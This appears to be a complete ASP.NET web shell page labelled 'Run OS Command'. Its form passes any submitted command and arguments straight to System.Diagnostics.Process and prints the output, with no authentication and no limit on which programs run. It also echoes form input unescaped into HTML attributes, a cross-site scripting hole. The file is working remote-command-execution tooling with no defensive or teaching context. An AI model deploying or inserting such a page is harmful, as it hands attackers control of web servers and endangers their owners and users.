<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>Run OS Command</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background: #f0f0f0;
            padding: 40px;
        }
        #container {
            max-width: 800px;
            margin: auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px #ccc;
        }
        textarea {
            width: 100%;
            height: 300px;
            background: #000;
            color: #0f0;
            padding: 10px;
            border: none;
            resize: none;
        }
        input, button {
            padding: 10px;
            font-size: 16px;
            margin-top: 10px;
        }
        input[type="text"] {
            width: 60%;
        }
    </style>
</head>
<body>
    <div id="container">
        <h2>Run OS Command</h2>
        <form method="post">
            <label>Command:</label><br />
            <input type="text" name="cmd" placeholder="e.g. ipconfig" value="<%= Request.Form["cmd"] %>" /><br />
            <label>Arguments:</label><br />
            <input type="text" name="args" placeholder="e.g. /all" value="<%= Request.Form["args"] %>" /><br />
            <button type="submit">Run</button>
        </form>
        <h3>Output</h3>
        <textarea readonly>
<%
    if (IsPostBack)
    {
        try
        {
            string cmd = Request.Form["cmd"];
            string args = Request.Form["args"] ?? "";

            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.FileName = cmd;
            psi.Arguments = args;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                string full = output + (string.IsNullOrWhiteSpace(error) ? "" : "\n[ERROR]\n" + error);
                Response.Write(Server.HtmlEncode(full));
            }
        }
        catch (Exception ex)
        {
            Response.Write("ERROR: " + Server.HtmlEncode(ex.Message));
        }
    }
%>
        </textarea>
    </div>
</body>
</html>
